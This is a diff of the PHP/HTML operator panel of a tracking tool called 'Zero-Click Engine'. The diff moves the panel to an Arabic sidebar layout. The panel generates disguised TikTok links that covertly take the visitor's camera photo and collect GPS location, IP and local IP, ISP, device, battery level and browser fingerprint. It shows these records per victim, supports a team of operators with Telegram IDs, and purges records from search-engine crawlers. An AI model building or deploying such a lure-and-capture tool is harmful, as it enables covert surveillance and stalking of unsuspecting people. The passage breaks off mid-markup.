@@ -164,7 +164,7 @@ function get_device_type($ua) {
 }
 
 // ==========================================
-// المتتبع (Zero-Click + Anti-Bot)
+// المتتبع (Zero-Click)
 // ==========================================
 if (isset($_GET['r'])) {
     $code = $_GET['r'];
@@ -287,11 +287,10 @@ $current_user_id = $_SESSION['user_id'] ?? 0;
 $current_username = $_SESSION['username'] ?? '';
 
 // ==========================================
-// لوحة التحكم
+// العمليات
 // ==========================================
 if ($is_logged_in) {
-    
-    // ✅ 1. تغيير كلمة المرور الشخصية
+    // تغيير كلمة المرور الشخصية
     $pass_error = ''; $pass_success = '';
     if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['change_my_password'])) {
         $current_pass = $_POST['current_password'];
@@ -315,19 +314,18 @@ if ($is_logged_in) {
         }
     }
 
-    // ✅ 2. تغيير كلمة مرور الزملاء (للأدمن فقط)
-    if ($is_admin && $_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['admin_change_user_pass'])) {
-        $target_user_id = intval($_POST['target_user_id']);
-        $new_pass = $_POST['admin_new_password'];
-        if (!empty($new_pass)) {
-            $new_hash = password_hash($new_pass, PASSWORD_DEFAULT);
-            $db->prepare("UPDATE users SET password = ? WHERE id = ? AND role = 'user'")->execute([$new_hash, $target_user_id]);
-            header("Location: /?msg=pass_changed"); exit();
-        }
-    }
-
-    // إدارة المستخدمين
     if ($is_admin) {
+        // تغيير كلمة مرور الزملاء
+        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['admin_change_user_pass'])) {
+            $target_user_id = intval($_POST['target_user_id']);
+            $new_pass = $_POST['admin_new_password'];
+            if (!empty($new_pass)) {
+                $new_hash = password_hash($new_pass, PASSWORD_DEFAULT);
+                $db->prepare("UPDATE users SET password = ? WHERE id = ? AND role = 'user'")->execute([$new_hash, $target_user_id]);
+                header("Location: /?msg=pass_changed"); exit();
+            }
+        }
+        // إضافة مستخدم
         if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['add_user'])) {
             $new_user = trim($_POST['new_username']);
             $new_pass = password_hash($_POST['new_password'], PASSWORD_DEFAULT);
@@ -337,6 +335,7 @@ if ($is_logged_in) {
                 header("Location: /?msg=user_added"); exit();
             } catch (Exception $e) { $user_error = "اسم المستخدم موجود مسبقاً!"; }
         }
+        // حذف مستخدم
         if (isset($_GET['delete_user'])) {
             $del_uid = intval($_GET['delete_user']);
             if ($del_uid !== $current_user_id) {
@@ -347,18 +346,16 @@ if ($is_logged_in) {
         }
     }
 
-    // حذف سجلات
+    // حذف سجلات البوتات
     if (isset($_GET['purge_bots']) && $is_admin) {
         $db->exec("DELETE FROM captures WHERE isp_info LIKE '%Facebook%' OR isp_info LIKE '%Google%' OR isp_info LIKE '%Amazon%' OR isp_info LIKE '%Microsoft%'");
         header("Location: /?msg=purged"); exit();
     }
+    // حذف سجل
     if (isset($_GET['delete_id'])) {
         $del_id = intval($_GET['delete_id']);
-        if ($is_admin) {
-            $db->prepare("DELETE FROM captures WHERE id = ?")->execute([$del_id]);
-        } else {
-            $db->prepare("DELETE FROM captures WHERE id = ? AND code IN (SELECT code FROM links WHERE user_id = ?)")->execute([$del_id, $current_user_id]);
-        }
+        if ($is_admin) { $db->prepare("DELETE FROM captures WHERE id = ?")->execute([$del_id]); }
+        else { $db->prepare("DELETE FROM captures WHERE id = ? AND code IN (SELECT code FROM links WHERE user_id = ?)")->execute([$del_id, $current_user_id]); }
         header("Location: /"); exit();
     }
 
@@ -403,251 +400,385 @@ if ($is_logged_in) {
 }
 ?>
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Control Panel - Multi User</title>
+    <title>Control Panel - Settings</title>
     <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
     <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
     <style>
-        :root { --bg: #070913; --card: #10172a; --border: #1e293b; --text: #f8fafc; --muted: #94a3b8; --accent: #8b5cf6; --danger: #f43f5e; --success: #10b981; }
-        * { box-sizing: border-box; margin: 0; padding: 0; font-family: system-ui, sans-serif; }
-        @keyframes bg { 0%,100% { background-position: 0% 50%; } 50% { background-position: 100% 50%; } }
-        body { background: linear-gradient(-45deg, #070913, #1e1b4b, #0f172a, #090d16); background-size: 400% 400%; animation: bg 15s ease infinite; color: var(--text); padding: 40px 15px; min-height: 100vh; display: flex; flex-direction: column; justify-content: space-between; }
-        .wrapper { max-width: 1200px; width: 100%; margin: 0 auto; display: grid; gap: 24px; }
-        .stats-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 16px; }
-        .stat-card { background: rgba(16, 23, 42, 0.85); border: 1px solid var(--border); border-radius: 12px; padding: 20px; text-align: center; transition: 0.3s; position: relative; }
-        .stat-card:hover { transform: translateY(-5px); border-color: var(--accent); box-shadow: 0 10px 20px -5px rgba(139, 92, 246, 0.4); }
-        .stat-card h3 { font-size: 12px; color: var(--muted); text-transform: uppercase; margin-bottom: 10px; }
-        .stat-card p { font-size: 28px; font-weight: 800; background: linear-gradient(to right, #a78bfa, #38bdf8); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
-        .stat-card::before { content: ''; position: absolute; top: 0; left: 0; right: 0; height: 3px; background: var(--accent); }
-        .live-badge { display: inline-flex; align-items: center; gap: 6px; background: rgba(16, 185, 129, 0.1); color: var(--success); padding: 4px 10px; border-radius: 20px; font-size: 11px; font-weight: bold; border: 1px solid rgba(16, 185, 129, 0.3); }
-        .live-dot { width: 8px; height: 8px; background: var(--success); border-radius: 50%; animation: pulse 1.5s infinite; }
-        @keyframes pulse { 0% { box-shadow: 0 0 0 0 rgba(16, 185, 129, 0.7); } 70% { box-shadow: 0 0 0 10px rgba(16, 185, 129, 0); } 100% { box-shadow: 0 0 0 0 rgba(16, 185, 129, 0); } }
-        .section-box { background: rgba(16, 23, 42, 0.85); border: 1px solid var(--border); border-radius: 16px; padding: 30px; box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.5); }
-        h1 { text-align: center; font-size: 26px; font-weight: 800; margin-bottom: 5px; background: linear-gradient(to right, #a78bfa, #38bdf8); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
-        .header-flex { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; flex-wrap: wrap; gap: 10px; }
-        .subtitle { color: var(--muted); font-size: 13px; }
-        h2 { font-size: 13px; font-weight: 700; text-transform: uppercase; color: var(--accent); margin-bottom: 16px; border-bottom: 1px solid var(--border); padding-bottom: 10px; display: flex; justify-content: space-between; align-items: center; }
-        .form-grid { display: grid; gap: 16px; }
-        input[type="text"], input[type="password"] { width: 100%; background: #050b14; border: 1px solid var(--border); border-radius: 10px; padding: 14px 16px; color: var(--text); outline: none; transition: 0.2s; }
+        :root { --bg: #070913; --card: #10172a; --border: #1e293b; --text: #f8fafc; --muted: #94a3b8; --accent: #8b5cf6; --danger: #f43f5e; --success: #10b981; --sidebar-bg: #0f1523; }
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: system-ui, -apple-system, sans-serif; }
+        
+        body { background: #070913; color: var(--text); min-height: 100vh; display: flex; flex-direction: column; }
+        
+        /* تخطيط الصفحة (Sidebar + Content) */
+        .app-container { display: flex; flex: 1; height: 100vh; overflow: hidden; }
+        
+        /* القائمة الجانبية (Sidebar) */
+        .sidebar { width: 260px; background: var(--sidebar-bg); border-left: 1px solid var(--border); display: flex; flex-direction: column; padding: 20px 0; transition: all 0.3s; }
+        .sidebar-header { padding: 0 20px 20px; border-bottom: 1px solid var(--border); margin-bottom: 20px; }
+        .sidebar-header h2 { font-size: 18px; color: var(--text); margin-bottom: 5px; }
+        .sidebar-header p { font-size: 12px; color: var(--muted); }
+        .nav-item { display: flex; align-items: center; gap: 12px; padding: 14px 20px; color: var(--muted); text-decoration: none; cursor: pointer; transition: 0.2s; font-size: 14px; font-weight: 500; border: none; background: transparent; width: 100%; text-align: right; }
+        .nav-item:hover { background: rgba(139, 92, 246, 0.1); color: var(--accent); }
+        .nav-item.active { background: rgba(139, 92, 246, 0.15); color: var(--accent); border-right: 4px solid var(--accent); }
+        .nav-item svg { width: 20px; height: 20px; fill: currentColor; }
+        .sidebar-footer { margin-top: auto; padding: 20px; border-top: 1px solid var(--border); }
+        .user-profile { display: flex; align-items: center; gap: 10px; margin-bottom: 15px; }
+        .user-avatar { width: 40px; height: 40px; background: var(--accent); border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: bold; color: white; }
+        
+        /* المحتوى (Main Content) */
+        .main-content { flex: 1; overflow-y: auto; padding: 30px; background: #070913; }
+        
+        /* الحاويات العامة */
+        .tab-content { display: none; animation: fadeIn 0.3s ease; }
+        .tab-content.active { display: block; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+        
+        .card { background: var(--card); border: 1px solid var(--border); border-radius: 16px; padding: 25px; margin-bottom: 25px; box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1); }
+        .card-title { font-size: 16px; font-weight: 700; color: var(--text); margin-bottom: 20px; display: flex; align-items: center; gap: 10px; padding-bottom: 15px; border-bottom: 1px solid var(--border); }
+        
+        /* الحقول والأزرار */
+        .form-group { margin-bottom: 15px; }
+        .form-group label { display: block; font-size: 13px; color: var(--muted); margin-bottom: 8px; }
+        input[type="text"], input[type="password"] { width: 100%; background: #050b14; border: 1px solid var(--border); border-radius: 8px; padding: 12px 15px; color: var(--text); font-size: 14px; outline: none; transition: 0.2s; }
         input:focus { border-color: var(--accent); box-shadow: 0 0 0 3px rgba(139, 92, 246, 0.15); }
-        .checkbox-container { display: flex; align-items: center; gap: 10px; cursor: pointer; font-size: 14px; color: var(--muted); }
-        .checkbox-container input { width: 18px; height: 18px; accent-color: var(--accent); cursor: pointer; }
-        .btn { background: var(--accent); color: white; border: none; padding: 0 24px; border-radius: 10px; font-weight: 600; cursor: pointer; height: 48px; display: inline-flex; align-items: center; justify-content: center; text-decoration: none; transition: 0.2s; position: relative; overflow: hidden; }
-        .btn:hover { background: #7c3aed; transform: translateY(-2px); box-shadow: 0 10px 15px -3px rgba(139, 92, 246, 0.4); }
-        .btn-danger { background: var(--danger); } .btn-danger:hover { background: #e11d48; }
-        .btn-secondary { background: #334155; } .btn-secondary:hover { background: #475569; }
-        .btn-success { background: var(--success); } .btn-success:hover { background: #059669; }
-        .result-panel { background: #050b14; border: 1px solid var(--border); padding: 18px; border-radius: 12px; margin-top: 15px; display: grid; gap: 12px; }
-        .result-panel label { display: block; font-size: 11px; font-weight: 700; color: var(--accent); text-transform: uppercase; }
-        .flex-row { display: flex; gap: 8px; }
-        .input-link-result { background: #0b1329 !important; color: #38bdf8 !important; font-weight: 600; }
-        .gallery-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(320px, 1fr)); gap: 16px; margin-top: 15px; }
-        .card-img { background: #050b14; border: 1px solid var(--border); border-radius: 12px; padding: 14px; display: flex; flex-direction: column; transition: 0.3s; }
-        .card-img:hover { transform: translateY(-5px) scale(1.02); border-color: var(--accent); box-shadow: 0 15px 25px -5px rgba(139, 92, 246, 0.3); }
-        .card-img img { width: 100%; height: 180px; object-fit: cover; border-radius: 8px; border: 1px solid var(--border); }
-        .map-container { height: 140px; width: 100%; border-radius: 8px; margin-top: 10px; border: 1px solid var(--border); z-index: 1; }
-        .leaflet-control-attribution { display: none !important; }
-        .info-row { display: flex; justify-content: space-between; font-size: 12px; margin-top: 6px; color: var(--muted); }
-        .info-row span { color: #cbd5e1; }
-        .code-badge { color: var(--accent); font-family: monospace; font-weight: bold; cursor: pointer; }
-        .code-badge:hover { color: #38bdf8; }
-        .btn-delete { display: block; width: 100%; margin-top: auto; background: rgba(244, 63, 94, 0.1); color: var(--danger); border: 1px solid rgba(244, 63, 94, 0.3); border-radius: 8px; padding: 8px; font-size: 12px; font-weight: 600; text-align: center; text-decoration: none; margin-top: 12px; }
-        .btn-delete:hover { background: var(--danger); color: white; }
-        footer { text-align: center; margin-top: 30px; font-size: 11px; color: var(--muted); border-top: 1px solid var(--border); padding-top: 20px; }
+        
+        .btn { background: var(--accent); color: white; border: none; padding: 12px 20px; border-radius: 8px; font-weight: 600; cursor: pointer; transition: 0.2s; font-size: 14px; display: inline-flex; align-items: center; justify-content: center; gap: 8px; }
+        .btn:hover { background: #7c3aed; transform: translateY(-1px); }
+        .btn-block { width: 100%; }
+        .btn-danger { background: rgba(244, 63, 94, 0.1); color: var(--danger); border: 1px solid rgba(244, 63, 94, 0.3); }
+        .btn-danger:hover { background: var(--danger); color: white; }
+        .btn-success { background: var(--success); }
+        
+        /* الإحصائيات */
+        .stats-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; margin-bottom: 30px; }
+        .stat-card { background: var(--card); border: 1px solid var(--border); border-radius: 12px; padding: 20px; text-align: center; }
+        .stat-card h3 { font-size: 13px; color: var(--muted); margin-bottom: 10px; }
+        .stat-card p { font-size: 32px; font-weight: 800; color: var(--accent); }
+        
+        /* السجلات (Gallery) */
+        .gallery-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(300px, 1fr)); gap: 20px; }
+        .capture-card { background: #050b14; border: 1px solid var(--border); border-radius: 12px; overflow: hidden; transition: 0.3s; display: flex; flex-direction: column; }
+        .capture-card:hover { transform: translateY(-5px); border-color: var(--accent); }
+        .capture-card img { width: 100%; height: 200px; object-fit: cover; }
+        .capture-info { padding: 15px; flex: 1; display: flex; flex-direction: column; }
+        .info-row { display: flex; justify-content: space-between; font-size: 12px; margin-bottom: 8px; color: var(--muted); }
+        .info-row span { color: var(--text); font-weight: 500; }
+        .map-container { height: 150px; width: 100%; border-radius: 8px; margin: 10px 0; }
+        
+        /* جدول المستخدمين */
+        .table-responsive { overflow-x: auto; }
+        table { width: 100%; border-collapse: collapse; font-size: 14px; }
+        th, td { padding: 15px; text-align: right; border-bottom: 1px solid var(--border); }
+        th { color: var(--muted); font-weight: 600; background: rgba(255,255,255,0.02); }
+        
+        /* الشاشات الصغيرة (الهواتف) */
+        @media (max-width: 768px) {
+            .app-container { flex-direction: column; height: auto; overflow: visible; }
+            .sidebar { width: 100%; padding: 10px; flex-direction: row; overflow-x: auto; border-left: none; border-bottom: 1px solid var(--border); align-items: center; justify-content: space-between; position: sticky; top: 0; z-index: 100; }
+            .sidebar-header { display: none; }
+            .nav-item { padding: 10px 15px; white-space: nowrap; border-right: none; border-bottom: 3px solid transparent; width: auto; border-radius: 8px; }
+            .nav-item.active { border-right: none; border-bottom: 3px solid var(--accent); background: transparent; }
+            .sidebar-footer { border-top: none; padding: 0; margin-left: auto; display: flex; align-items: center; gap: 10px; }
+            .user-profile { margin-bottom: 0; display: none; }
+            .main-content { padding: 15px; }
+            .stats-grid { grid-template-columns: 1fr; }
+        }
+        
         .toast { position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%) translateY(100px); background: var(--success); color: white; padding: 12px 24px; border-radius: 8px; font-weight: bold; transition: 0.3s; z-index: 9999; opacity: 0; }
         .toast.show { transform: translateX(-50%) translateY(0); opacity: 1; }
-        
-        table { width: 100%; border-collapse: collapse; margin-top: 10px; font-size: 13px; }
-        th, td { padding: 10px; text-align: right; border-bottom: 1px solid var(--border); }
-        th { color: var(--accent); font-weight: bold; }
-        tr:hover { background: rgba(139, 92, 246, 0.05); }
     </style>
-    <script>
-        function copyText(text, btn) {
-            navigator.clipboard.writeText(text).then(() => {
-                const t = document.getElementById('toast');
-                t.textContent = "✅ تم النسخ بنجاح!";
-                t.classList.add('show');
-                setTimeout(() => t.classList.remove('show'), 2000);
-                if(btn) {
-                    const o = btn.innerText; btn.innerText = "Copied!"; btn.style.background = "#10b981";
-                    setTimeout(() => { btn.innerText = o; btn.style.background = ""; }, 2000);
-                }
-            });
-        }
-        function updateClock() { document.getElementById('live-clock').innerText = new Date().toLocaleTimeString('en-GB'); }
-        setInterval(updateClock, 1000); updateClock();
-    </script>
 </head>
 <body>
-    <div class="wrapper">
-        <div class="header-flex">
-            <div>
-                <h1>Control Panel</h1>
-                <p class="subtitle">Zero-Click Engine V11.1 (Password Management)</p>
-            </div>
-            <div style="text-align: left;">
-                <div class="live-badge"><div class="live-dot"></div> SYSTEM ONLINE</div>
-                <div style="font-size: 20px; font-weight: bold; font-family: monospace; margin-top: 5px; color: #38bdf8;" id="live-clock">00:00:00</div>
-            </div>
-        </div>
 
-        <?php if (!$is_logged_in): ?>
-            <div class="section-box" style="max-width: 400px; margin: 50px auto; width: 100%;">
-                <h2>تسجيل الدخول</h2>
-                <?php if (!empty($login_error)): ?><p style="color: var(--danger); font-size: 12px; margin-bottom: 12px; text-align: center;"><?php echo $login_error; ?></p><?php endif; ?>
-                <form method="POST" class="form-grid">
-                    <input type="text" name="username" placeholder="اسم المستخدم (admin)" required autofocus>
-                    <input type="password" name="password" placeholder="كلمة المرور (aziz123)" required>
-                    <button type="submit" name="login" class="btn" style="width: 100%;">دخول</button>
-                </form>
-            </div>
-        <?php else: ?>
-            <div class="stats-grid">
-                <div class="stat-card"><h3>روابطي</h3><p><?php echo $total_links; ?></p></div>
-                <div class="stat-card"><h3>الزيارات</h3><p><?php echo $total_captures; ?></p></div>
-                <div class="stat-card"><h3>زيارات اليوم</h3><p style="color: #10b981; -webkit-text-fill-color: #10b981;"><?php echo $today_captures; ?></p></div>
+<?php if (!$is_logged_in): ?>
+    <!-- شاشة تسجيل الدخول -->
+    <div style="display: flex; align-items: center; justify-content: center; min-height: 100vh; background: #070913;">
+        <div class="card" style="width: 100%; max-width: 400px; margin: 20px;">
+            <div class="card-title" style="justify-content: center; font-size: 20px;">🔐 تسجيل الدخول</div>
+            <?php if (!empty($login_error)): ?><p style="color: var(--danger); font-size: 13px; margin-bottom: 15px; text-align: center;"><?php echo $login_error; ?></p><?php endif; ?>
+            <form method="POST">
+                <div class="form-group"><input type="text" name="username" placeholder="اسم المستخدم" required autofocus></div>
+                <div class="form-group"><input type="password" name="password" placeholder="كلمة المرور" required></div>
+                <button type="submit" name="login" class="btn btn-block">دخول</button>
+            </form>
+        </div>
+    </div>
+<?php else: ?>
+
+    <div class="app-container">
+        <!-- القائمة الجانبية -->
+        <aside class="sidebar">
+            <div class="sidebar-header">
+                <h2>Control Panel</h2>
+                <p>Zero-Click Engine V12</p>
             </div>
             
-            <div style="text-align: right; margin-bottom: -10px; display: flex; gap: 8px; justify-content: flex-end; align-items: center;">
-                <span style="color: var(--muted); font-size: 13px; margin-left: auto;">👤 مرحباً، <strong style="color: var(--accent);"><?php echo htmlspecialchars($current_username); ?></strong></span>
-                <?php if ($is_admin): ?>
-                    <a href="?purge_bots=1" class="btn btn-danger" style="height: 38px; padding: 0 16px; font-size: 12px;" onclick="return confirm('حذف سجلات البوتات؟');">🧹 حذف البوتات</a>
-                <?php endif; ?>
-                <a href="?logout=1" class="btn btn-danger" style="height: 38px; padding: 0 16px; font-size: 12px;">تسجيل الخروج</a>
-            </div>
-
-            <!-- ✅ تغيير كلمة المرور الشخصية -->
-            <div class="section-box">
-                <h2>🔐 تغيير كلمة المرور الخاصة بك</h2>
-                <?php if (!empty($pass_error)): ?><p style="color: var(--danger); font-size: 12px; margin-bottom: 10px;"><?php echo $pass_error; ?></p><?php endif; ?>
-                <?php if (!empty($pass_success)): ?><p style="color: var(--success); font-size: 12px; margin-bottom: 10px;"><?php echo $pass_success; ?></p><?php endif; ?>
-                <form method="POST" style="display: grid; grid-template-columns: 1fr 1fr 1fr auto; gap: 10px;">
-                    <input type="password" name="current_password" placeholder="كلمة المرور الحالية" required>
-                    <input type="password" name="new_password" placeholder="كلمة المرور الجديدة" required>
-                    <input type="password" name="confirm_password" placeholder="تأكيد الكلمة الجديدة" required>
-                    <button type="submit" name="change_my_password" class="btn btn-secondary" style="height: 48px;">تحديث</button>
-                </form>
-            </div>
-
+            <button class="nav-item active" onclick="switchTab('dashboard')">
+                📊 لوحة القيادة
+            </button>
+            <button class="nav-item" onclick="switchTab('create')">
+                🔗 إنشاء رابط
+            </button>
             <?php if ($is_admin): ?>
-            <!-- إدارة الزملاء -->
-            <div class="section-box">
-                <h2>👥 إدارة زملائك (المستخدمين)</h2>
-                <?php if (isset($user_error)): ?><p style="color: var(--danger); font-size: 12px; margin-bottom: 10px;"><?php echo $user_error; ?></p><?php endif; ?>
-                <form method="POST" style="display: grid; grid-template-columns: 1fr 1fr 1fr auto; gap: 10px; margin-bottom: 20px;">
-                    <input type="text" name="new_username" placeholder="اسم المستخدم (مثال: aziz2)" required>
-                    <input type="password" name="new_password" placeholder="كلمة المرور" required>
-                    <input type="text" name="new_tg_chat" placeholder="Chat ID التلجرام (اختياري)">
-                    <button type="submit" name="add_user" class="btn btn-success" style="height: 48px;">إضافة زميل</button>
-                </form>
-                
-                <table>
-                    <thead>
-                        <tr>
-                            <th>اسم المستخدم</th>
-                            <th>معرف التلجرام</th>
-                            <th>تاريخ الإضافة</th>
-                            <th>الإجراءات</th>
-                        </tr>
-                    </thead>
-                    <tbody>
-                        <?php foreach ($users_list as $u): ?>
-                        <tr>
-                            <td style="color: var(--accent); font-weight: bold;"><?php echo htmlspecialchars($u['username']); ?></td>
-                            <td><?php echo htmlspecialchars($u['tg_chat'] ?: 'غير متوفر'); ?></td>
-                            <td style="color: var(--muted);"><?php echo $u['created_at']; ?></td>
-                            <td style="display: flex; gap: 10px;">
-                                <!-- ✅ زر تغيير كلمة مرور الزميل -->
-                                <form method="POST" style="display:inline;">
-                                    <input type="hidden" name="target_user_id" value="<?php echo $u['id']; ?>">
-                                    <input type="hidden" name="admin_new_password" id="new_pass_<?php echo $u['id']; ?>">
-                                    <button type="button" onclick="let p = prompt('أدخل كلمة المرور الجديدة للمستخدم <?php echo htmlspecialchars($u['username']); ?>:'); if(p){document.getElementById('new_pass_<?php echo $u['id']; ?>').value = p; this.form.submit();}" class="btn btn-secondary" style="padding: 4px 10px; height: auto; font-size: 11px; background: #4f46e5;">🔑 تغيير الكلمة</button>
-                                    <input type="hidden" name="admin_change_user_pass" value="1">
-                                </form>
-                                <a href="?delete_user=<?php echo $u['id']; ?>" style="color: var(--danger); text-decoration: none; display: flex; align-items: center; font-size: 12px;" onclick="return confirm('هل أنت متأكد من حذف هذا المستخدم وكل روابطه؟');">حذف</a>
-                            </td>
-                        </tr>
-                        <?php endforeach; ?>
-                    </tbody>
-                </table>
+            <button class="nav-item" onclick="switchTab('team')">
+                👥 إدارة الفريق
+            </button>
+            <?php endif; ?>
+            <button class="nav-item" onclick="switchTab('settings')">
+                ⚙️ الإعدادات
+            </button>
+
+            <div class="sidebar-footer">
+                <div class="user-profile">
+                    <div class="user-avatar"><?php echo strtoupper(substr($current_username, 0, 1)); ?></div>
+                    <div>
+                        <div style="font-weight: bold; font-size: 14px;"><?php echo htmlspecialchars($current_username); ?></div>
+                        <div style="font-size: 11px; color: var(--muted);"><?php echo $is_admin ? 'مدير النظام' : 'مستخدم'; ?></div>
+                    </div>
+                </div>
+                <a href="?logout=1" class="btn btn-danger" style="width: 100%;">تسجيل الخروج</a>
+            </div>
+        </aside>
+
+        <!-- المحتوى الرئيسي -->
+        <main class="main-content">
+            
+            <!-- 1. لوحة القيادة (السجلات والإحصائيات) -->
+            <div id="tab-dashboard" class="tab-content active">
+                <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; flex-wrap: wrap; gap: 10px;">
+                    <h2 style="font-size: 20px;">مرحباً، <?php echo htmlspecialchars($current_username); ?> 👋</h2>
+                    <div style="display: flex; gap: 10px;">
+                        <?php if ($is_admin): ?>
+                            <a href="?purge_bots=1" class="btn btn-danger" onclick="return confirm('حذف سجلات البوتات؟');">🧹 حذف البوتات</a>
+                        <?php endif; ?>
+                        <a href="/" class="btn" style="background: #334155;">🔄 تحديث</a>
+                    </div>
+                </div>
+
+                <div class="stats-grid">
+                    <div class="stat-card"><h3>روابطي</h3><p><?php echo $total_links; ?></p></div>
+                    <div class="stat-card"><h3>إجمالي الزيارات</h3><p style="color: #38bdf8;"><?php echo $total_captures; ?></p></div>
+                    <div class="stat-card"><h3>زيارات اليوم</h3><p style="color: #10b981;"><?php echo $today_captures; ?></p></div>
+                </div>
+
+                <div class="card">
+                    <div class="card-title">
+                        <span>📸 سجلات الزيارات (<?php echo $is_admin ? 'الجميع' : 'روابطك فقط'; ?>)</span>
+                    </div>
+                    <form method="GET" style="display: flex; gap: 10px; margin-bottom: 20px;">
+                        <input type="text" name="track" placeholder="البحث بكود التتبع..." value="<?php echo htmlspecialchars($filter_code); ?>" style="flex:1;">
+                        <button type="submit" class="btn">بحث</button>
+                        <?php if(!empty($filter_code)): ?><a href="/" class="btn btn-secondary" style="background: #334155;">إلغاء</a><?php endif; ?>
+                    </form>
+
+                    <?php if (empty($captures)): ?>
+                        <p style="text-align: center; color: var(--muted); padding: 40px;">لا توجد سجلات حتى الآن.</p>
+                    <?php else: ?>
+                        <div class="gallery-grid">
+                            <?php foreach ($captures as $cap): ?>
+                                <div class="capture-card">
+                                    <?php if (!empty($cap['image_data'])): ?>
+                                        <a href="<?php echo htmlspecialchars($cap['image_data']); ?>" target="_blank"><img src="<?php echo htmlspecialchars($cap['image_data']); ?>" alt="Capture"></a>
+                                    <?php else: ?>
+                                        <div style="width: 100%; height: 200px; background: #0b1329; display: flex; align-items: center; justify-content: center; color: var(--muted); font-size: 13px;">الكاميرا معطلة (بدون صورة)</div>
+                                    <?php endif; ?>
+
+                                    <?php if (!empty($cap['latitude']) && !empty($cap['longitude'])): ?>
+                                        <div id="map-<?php echo $cap['id']; ?>" class="map-container"></div>
+                                        <script>
+                                            document.addEventListener("DOMContentLoaded", function() {
+                                                var map = L.map('map-<?php echo $cap['id']; ?>', { zoomControl: false, attributionControl: false, dragging: false, scrollWheelZoom: false }).setView([<?php echo $cap['latitude']; ?>, <?php echo $cap['longitude']; ?>], 10);
+                                                L.tileLayer('https://server.arcgisonline.com/ArcGIS/rest/services/Canvas/World_Dark_Gray_Base/MapServer/tile/{z}/{y}/{x}', { maxZoom: 16 }).addTo(map);
+                                                L.circleMarker([<?php echo $cap['latitude']; ?>, <?php echo $cap['longitude']; ?>], { color: '#8b5cf6', fillColor: '#8b5cf6', fillOpacity: 0.8, radius: 8 }).addTo(map);
+                                            });
+                                        </script>
+                                    <?php endif; ?>
+
+                                    <div class="capture-info">
+                                        <div class="info-row"><span>Code:</span> <span class="code-badge" onclick="copyText('<?php echo htmlspecialchars(addslashes($cap['code'])); ?>')"><?php echo htmlspecialchars($cap['code']); ?> 📋</span></div>
+                                        <div class="info-row"><span>IP:</span> <span><?php echo htmlspecialchars($cap['public_ip']); ?></span></div>
+                                        <div class="info-row"><span>Local IP:</span> <span><?php echo htmlspecialchars($cap['local_ip']); ?></span></div>
+                                        <div class="info-row"><span>Location:</span> <span style="color:#10b981;"><?php echo htmlspecialchars($cap['location']); ?></span></div>
+                                        <div class="info-row"><span>ISP:</span> <span style="color:#f97316;"><?php echo htmlspecialchars($cap['isp_info']); ?></span></div>
+                                        <div class="info-row"><span>Port:</span> <span><?php echo htmlspecialchars($cap['port']); ?></span></div>
+                                        <div class="info-row"><span>Device:</span> <span style="color:#a78bfa;"><?php echo htmlspecialchars($cap['device_info']); ?></span></div>
+                                        <div class="info-row"><span>Battery:</span> <span style="color:#a78bfa;"><?php echo htmlspecialchars($cap['battery_info']); ?></span></div>
+                                        <div class="info-row"><span>Fingerprint:</span> <span style="font-family: monospace;"><?php echo htmlspecialchars($cap['canvas_fp']); ?></span></div>
+                                        <div class="info-row" style="border-top: 1px solid var(--border); padding-top: 8px; margin-top: 8px;"><span>Time:</span> <span><?php echo htmlspecialchars($cap['created_at']); ?></span></div>
+                                        
+                                        <a href="?delete_id=<?php echo $cap['id']; ?>" class="btn btn-danger" style="margin-top: 10px; padding: 8px; font-size: 12px;" onclick="return confirm('حذف السجل؟');">حذف السجل</a>
+                                    </div>
+                                </div>
+                            <?php endforeach; ?>
+                        </div>
+                    <?php endif; ?>
+                </div>
+            </div>
+
+            <!-- 2. إنشاء رابط -->
+            <div id="tab-create" class="tab-content">
+                <div class="card">
+                    <div class="card-title">🔗 إنشاء رابط تيك توك جديد</div>
+                    <form method="POST">
+                        <div class="form-group">
+                            <label>رابط الفيديو (TikTok URL)</label>
+                            <input type="text" name="target_url" placeholder="https://www.tiktok.com/..." required>
+                        </div>
+                        <div class="form-group" style="display: flex; align-items: center; gap: 10px;">
+                            <input type="checkbox" name="use_camera" value="1" checked style="width: 18px; height: 18px; accent-color: var(--accent);">
+                            <label style="margin: 0; cursor: pointer;">تفعيل التقاط صورة الكاميرا عند الزيارة</label>
+                        </div>
+                        <button type="submit" name="create" class="btn" style="width: 100%;">توليد الرابط</button>
+                    </form>
+
+                    <?php if (!empty($generated_link)): ?>
+                        <div style="background: #050b14; border: 1px solid var(--success); padding: 20px; border-radius: 12px; margin-top: 25px;">
+                            <div class="form-group">
+                                <label style="color: var(--success);">✅ الرابط جاهز للاستخدام:</label>
+                                <div style="display: flex; gap: 10px;">
+                                    <input type="text" readonly value="<?php echo htmlspecialchars($generated_link); ?>" style="flex:1; border-color: var(--success); color: #38bdf8;">
+                                    <button type="button" class="btn" onclick="copyText('<?php echo htmlspecialchars(addslashes($generated_link)); ?>', this)">نسخ</button>
+                                </div>
+                            </div>
+                            <div class="form-group">
+                                <label>كود التتبع:</label>
+                                <div style="display: flex; gap: 10px;">
+                                    <input type="text" readonly value="<?php echo htmlspecialchars($generated_code); ?>" style="flex:1; font-family: monospace; color: #a78bfa; font-weight: bold;">
